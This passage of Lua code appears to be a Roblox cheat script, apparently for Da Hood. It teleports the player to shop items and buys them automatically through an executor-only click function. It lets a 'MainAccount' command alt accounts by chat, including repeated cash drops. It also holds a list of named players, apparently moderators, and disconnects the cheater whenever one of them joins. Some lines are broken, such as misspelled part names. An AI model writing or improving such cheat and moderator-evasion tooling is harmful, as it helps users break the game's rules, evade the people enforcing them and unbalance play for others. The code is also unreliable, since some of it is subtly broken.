    wait()
end
end)
Section:NewButton("Buy Flashbang", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Flashbang] - $567"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Flashbang]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Basketball", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Basketball] - $103"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Basketball]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy GrenadeLauncher", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[GrenadeLauncher] - $10300"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[GrenadeLauncher]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy GrenadeLauncher Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["12 [GrenadeLauncher Ammo] - $3090"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[GrenadeLauncher Ammo]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Rifle", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Rifle] - $1597"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Rifle]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Rifle Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["5 [Rifle Ammo] - $258"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Rifle Ammo]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Flowers", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Flowers] - $5"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Flowers]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy FoodsCart", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[FoodsCart] - $16"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[FoodsCart]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Flamethrower", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Flamethrower] - $25750"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Flamethrower]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Flamethrower Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["140 [Flamethrower Ammo] - $1597"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Flamethrower Ammo]"]:Activate()
    wait()
end
end)

-- Chat Connect --
        local MainAccount = "24ktreezz" -- MainAccount Username

game.Players[MainAccount].Chatted:Connect(function(msg)
        if msg:lower() == "/e bring" then
            game.Players.LocalPlayer.HumanoidRootPart.cframe = cframe.new(game.Players[MainAccount].character.HumanoidRootPart.Position)*cframe.new(0,2,0)
            Event:FireServer(A_1, A_2)
        elseif msg:lower() == "/e test" then
            chat("work real")
        elseif msg:lower() == "/e test2" then
            chat("work real")
        elseif msg:lower() == ".bring" then
                       wait(.1)
            local DefaultDanceanim = Instance.new('Animation');
            DefaultDanceanim.AnimationId = "rbxassetid://10275008655";
            game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(DefaultDanceanim):Play() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[MainAccount].character.HumanoidRootPart.Position)*CFrame.new(0,2,0)
            wait(0.2)
        elseif msg:lower() == ".leave" then
            game:Shutdown()

        elseif msg:lower() == ".rejoin" then

game:GetService("TeleportService"):Teleport(game.PlaceId)

        elseif msg:lower() == ".rj" then

game:GetService("TeleportService"):Teleport(game.PlaceId)

        elseif msg:lower() == ".dance2" then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[MainAccount].character.HumanoidRootPart.Position)*CFrame.new(0,2,0)
            wait(.1)
            local DefaultDanceanim = Instance.new('Animation');
            DefaultDanceanim.AnimationId = "rbxassetid://11710529975";
            game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(DefaultDanceanim):Play()

        elseif msg:lower() == ".dance" then
           
            local DefaultDanceanim = Instance.new('Animation');
            DefaultDanceanim.AnimationId = "rbxassetid://11710529975";
            game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(DefaultDanceanim):Play()

        elseif msg:lower() == ".re" then
           game.Players.LocalPlayer.Character.Humanoid:ChangeState(15)
    task.wait()
    game.Players.LocalPlayer.Character.Humanoid:ChangeState(16)
    task.wait()
    game.Players.LocalPlayer.Character.Humanoid:ChangeState(0)

        elseif msg:lower() == ".reset" then

game.ReplicatedStorage.MainEvent:FireServer("ResetNew")Character:FindFirstChildOfClass("Humanoid"):ChangeState'Dead'

        elseif msg:lower() == ".kick" then
            game.Players.LocalPlayer:kick("You have been kicked from the game")

        elseif msg:lower() == ".fakeban" then

game.Players.LocalPlayer:kick("You have been banned!")

        elseif msg:lower() == ".modban" then

game.Players.LocalPlayer:kick("Mod Team has BANNED you!")

        elseif msg:lower() == ".ban" then
            game.Players.LocalPlayer:kick("User BANNED")

        elseif msg:lower() == ".permban" then

game.Players.LocalPlayer:kick("PERMA-BAN")

        elseif msg:lower() == ".sit" then

game.Players.LocalPlayer.Character.Humanoid.Sit = true

        elseif msg:lower() == ".unsit" then

game.Players.LocalPlayer.Character.Humanoid.Sit = false

elseif msg:lower() == ".freeze" then

game.Players.LocalPlayer.Character.LowerTorso.Anchored = true
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = true

elseif msg:lower() == ".unfreeze" then

game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
	game.Players.LocalPlayer.Character.UppperTorso.Anchored = false

elseif msg:lower() == ".thaw" then

game.Players.LocalPlayer.Character.LowerTorso.Anchored = false

game.Players.LocalPlayer.Character.UppperTorso.Anchored = false

        elseif msg:lower() == ".dropcash" then
            wait(.1)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[MainAccount].character.HumanoidRootPart.Position)*CFrame.new(0,2,0)
            wait(.1)
            game.ReplicatedStorage.MainEvent:FireServer("DropMoney","10000")
        end
    end)

game:GetService("RunService").RenderStepped:Connect(function()
        wait()
        game.Players.AhpMCBqXaqCJ.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑]' .. game.Players.AhpMCBqXaqCJ.DisplayName)
        wait()
    end)
    game:GetService("RunService").RenderStepped:Connect(function()
        wait()
        game.Players.OodDExUIk.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑]' .. game.Players.OodDExUIk.DisplayName)
        wait()
    end)


    game:GetService("RunService").RenderStepped:Connect(function()
        for i,v in pairs(game.Workspace.Players:GetChildren()) do
        v:FindFirstChildWhichIsA('Humanoid').DisplayDistanceType = 'Subject'
        end
        wait()
    end)

--------------------------------------------------------------------------------------------------------------------  
local annoying = {"JokeTheFool", "Sherosama", "Papa_Mbaye", "AStrongMuscle", "streetren", "NikoSenpai", "WashedGarage", "iumu", "Benoxa", "Luutyy", "clubstar54", "givkitheth", "kywiexcx", "ATKDrizzy", "dtbbullet", "XavierWildYT", "RogueDaHoodKing", "paxxythecreator", "NatsuDBlaze", "AnqelicMar", "DrBlakMD", "DarkWhirlwind", "coreten", "LegacyCross", "Greed_Ocean"} -- you can add more players by doing {"Player1", "Player2"}
 
game.Players.PlayerAdded:Connect(function(plr)
for i, v in pairs(annoying) do
if plr.Name == v then
local loc = game.Players.LocalPlayer
loc:Kick("A Moderator Has Joined")
end
end
end)
else
    end
else
end
else
    print("this version is outdated, use new version.")
end
